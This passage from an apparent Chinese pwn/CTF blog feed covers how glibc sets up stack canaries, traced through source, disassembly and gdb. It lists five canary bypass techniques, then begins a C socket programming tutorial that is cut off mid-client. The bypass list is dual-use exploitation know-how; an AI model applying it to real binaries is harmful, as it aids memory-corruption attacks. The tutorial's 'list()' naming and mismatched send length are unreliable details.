class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><p>security_init()是ld文件中的一个子函数，在ida中可以看到，初始化canary为如下指令（以2.23版本为例）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000003C25                 mov     rdx, cs:qword_225E68</span><br><span class="line">.text:0000000000003C2C                 mov     rax, [rdx]</span><br><span class="line">.text:0000000000003C2F                 xor     al, al</span><br><span class="line">.text:0000000000003C31                 mov     fs:28h, rax</span><br><span class="line">.text:0000000000003C3A                 mov     rax, [rdx+8]</span><br><span class="line">.text:0000000000003C3E                 mov     fs:30h, rax</span><br><span class="line">.text:0000000000003C47                 mov     cs:qword_225E68, 0</span><br><span class="line">.text:0000000000003C52                 mov     cs:qword_225C70, rax</span><br></pre></td></tr></table></figure><p>其中，cs:qword_225E68即对应对应于存放_dl_random的地址。</p><p>（注：fs寄存器的内容可以通过在gdb中直接输入fsbase得到。）</p><p>而_dl_random的地址来自：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000019741                 cmp     [rsp+78h+var_49], 0</span><br><span class="line">.text:0000000000019746                 jz      loc_1983C</span><br><span class="line">.text:000000000001974C                 mov     rax, [rsp+20h]</span><br><span class="line">.text:0000000000019751                 mov     cs:qword_225E68, rax</span><br></pre></td></tr></table></figure><p>这里下个内存断点来跟进（直接关闭aslr）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; watch *(0x7fffffffde80+0x20)</span><br><span class="line">Hardware watchpoint 5: *(0x7fffffffde80+0x20)</span><br></pre></td></tr></table></figure><p>结果跟进到 <code>► 0x7ffff7df0786 &lt;_dl_sysdep_start+518&gt;    jmp    _dl_sysdep_start+304 &lt;0x7ffff7df06b0&gt;</code>里面来，在ida下看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000019778 loc_19778:</span><br><span class="line">.text:0000000000019778                 mov     rax, [rdx+8] </span><br><span class="line">.text:000000000001977C                 mov     [rsp+78h+var_49], 1</span><br><span class="line">.text:0000000000019781                 mov     [rsp+20h], rax</span><br><span class="line">.text:0000000000019786                 jmp     loc_196B0</span><br></pre></td></tr></table></figure><p>可以看到rsp+0x20的值来自[rdx+8]。分析整个函数，可以得知rdx的值是来自于<code>_dl_sysdep_start</code>函数的第一个参数（有一定的偏移，其值为0x7fffffffdf70，而<code>_dl_random</code>的值为0x7fffffffe2c9）。</p><p>继续追溯可以找到也是_dl_start来自的第一个参数（同样是0x7fffffffdf70）。</p><p>最终追溯到ld中start函数的rsp：0x7fffffffdf70。</p><h2 id="绕过堆栈保护方法"><a href="#绕过堆栈保护方法" class="headerlink" title="绕过堆栈保护方法"></a>绕过堆栈保护方法</h2><p>canary绕过方式总结下有这几种：</p><ol><li>直接通过相邻的变量puts或者printf，然后leak出来</li><li>逐位爆破</li><li>通过覆盖TLS结构（地址可以通过与libc的偏移计算得出）中的canary，从而绕过canary保护</li><li>劫持___stack_chk_fail的got表项</li><li>劫持栈上<code>*** stack smashing detected ***: ./canary terminated</code>中对应<code>./canary</code>处的指针，在发生smashing detected时泄漏出关键信息</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是堆栈保护技术？&quot;&gt;&lt;a href=&quot;#什么是堆栈保护技术？&quot; class=&quot;headerlink&quot; title=&quot;什么是堆栈保护技术？&quot;&gt;&lt;/a&gt;什么是堆栈保护技术？&lt;/h2&gt;&lt;p&gt;堆栈保护技术（即Stack canary）是用于防护栈溢出攻击的一种保护机制
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="gcc" scheme="https://nuoye-blog.github.io/tags/gcc/"/>
    
      <category term="canary" scheme="https://nuoye-blog.github.io/tags/canary/"/>
    
      <category term="stack" scheme="https://nuoye-blog.github.io/tags/stack/"/>
    
      <category term="protect" scheme="https://nuoye-blog.github.io/tags/protect/"/>
    
  </entry>
  
  <entry>
    <title>socket编程详解</title>
    <link href="https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/"/>
    <id>https://nuoye-blog.github.io/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-20T14:26:00.000Z</published>
    <updated>2020-05-20T14:26:10.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>网络进程标识：ip地址，协议，端口。</p><p>TCP/IP是传输控制协议/网间协议。</p><p>TCP/IP协议存在于OS中，网络服务通过OS提供，在OS中增加支持TCP/IP的系统调用。</p><p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。</p><h2 id="Socket-API"><a href="#Socket-API" class="headerlink" title="Socket API"></a>Socket API</h2><h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> protofamily, <span class="keyword">int</span> typ, <span class="keyword">int</span> protocol)</span></span>; <span class="comment">//返回sockfd</span></span><br></pre></td></tr></table></figure><p>该函数用于创建一个socket描述符，它唯一标识一个socket。其中三个参数分别如下：</p><ul><li>protofamily：即协议域，又称为协议族（family）。常用的协议族有，AF_INET(IPV4)、AF_INET6(IPV6)、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。当其为0时，会自动选择type对应的默认协议。</li><li>type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等。</li><li>protocol：顾名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议。</li></ul><p>注：protofamily与type不可随意组合。</p><h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind()函数"></a>bind()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用来把一个特定地址赋给sockfd，如127.0.0.1:80。若未用该函数直接connect()，list()时系统会随机分配一个端口号。</p><p>函数的三个参数分别为：</p><ul><li><p>sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。</p></li><li><p>addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ipv6对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span> </span><br><span class="line">    <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span class="comment">/* IPv6 address */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Unix域对应的是： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span> </span><br><span class="line">    <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>addrlen：对应的是地址的长度。</p></li></ul><h3 id="list-、connect-函数"><a href="#list-、connect-函数" class="headerlink" title="list()、connect()函数"></a>list()、connect()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure><p>list()函数用于服务器端侦听端口。</p><p>connect()函数用于客户端向服务器端发送连接请求。</p><h3 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept()函数"></a>accept()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;<span class="comment">//返回connect_fd</span></span><br></pre></td></tr></table></figure><p>该函数用于服务器端在list()之后接收请求，其中第二个参数addr用来接收返回值，返回值指向客户端地址。</p><p>注：accept默认会阻塞进程，直到有一个客户连接建立后返回。</p><h3 id="读写操作函数"><a href="#读写操作函数" class="headerlink" title="读写操作函数"></a>读写操作函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>这些函数用于接收和发送数据，不一一介绍，具体看man文档。</p><h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close()函数"></a>close()函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure><p>该函数用于关闭连接。</p><p>注：close操作只是使用相应socket描述字的引用计数减1，只有当引用计数为0时，才会触发TCP客户端向服务器发送终止连接请求。</p><h2 id="socket中TCP的建立"><a href="#socket中TCP的建立" class="headerlink" title="socket中TCP的建立"></a>socket中TCP的建立</h2><p>TCP协议通过三个报文段完成连接的建立，即三次握手：</p><ul><li>第一次握手：建立连接时，客户端发送syn包到服务器，并进入SYN_SEND状态，等待服务器确认。（SYN：同步序列编号）</li><li>第二次握手：服务器收到syn包，必须确认客户的SYN，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li><li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li></ul><h2 id="TCP连接的终止"><a href="#TCP连接的终止" class="headerlink" title="TCP连接的终止"></a>TCP连接的终止</h2><p>终止一个连接要经过四次握手，这是由TCP的半关闭造成的。</p><ol><li>客户端发送一个FIN，用来关闭客户端到服务器端的数据传送。</li><li>服务器端收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。</li><li>服务器端关闭与客户端的连接，发送一个FIN给客户端。</li><li>客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</li></ol><h2 id="socket编程实例"><a href="#socket编程实例" class="headerlink" title="socket编程实例"></a>socket编程实例</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, connect_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr) );</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(bind(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">listen</span>(socket_fd, <span class="number">10</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"listen socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"=====wait for connect====\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>( (connect_fd = accept(socket_fd, (struct sockaddr*)<span class="literal">NULL</span>, <span class="literal">NULL</span>) ) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = recv(connect_fd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())&#123;</span><br><span class="line"><span class="keyword">if</span>(send(connect_fd, <span class="string">"Hello, you are connect"</span>, <span class="number">27</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">perror(<span class="string">"send_error"</span>);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf[n] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you have recv msg: %s\n"</span>,buf);</span><br><span class="line"><span class="built_in">close</span>(connect_fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> socket_fd, n, rec_len;</span><br><span class="line"><span class="keyword">char</span> sendline[BUFSIZE];</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"usage: ./client &lt;ipaddress&gt;"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line"><span class="keyword">if</span>( inet_pton(AF_INET, argv[<span class="number">1</span>], &amp;servaddr.sin_addr) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"inet_pton error for %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg to server: \n"</span>);</span><br><span class="line">fgets(sendline, BUFSIZE, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span>(send(socket_fd, sendline, <span class="built_in">strlen</span>(sendline), <span class="number">0</span>) &lt; <span 